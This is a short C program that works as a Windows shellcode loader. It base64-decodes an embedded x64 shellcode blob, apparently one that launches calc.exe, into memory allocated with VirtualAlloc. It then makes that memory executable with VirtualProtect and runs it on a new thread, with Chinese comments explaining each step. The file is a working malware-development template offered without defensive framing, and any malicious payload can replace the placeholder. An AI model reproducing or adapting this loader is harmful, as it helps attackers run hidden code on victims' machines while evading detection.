#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int calc_len = sizeof(calc_payload);


int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	// 分配内存
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 将shellcode编码回来
	DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
	
	// 修改内存为可执行
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
	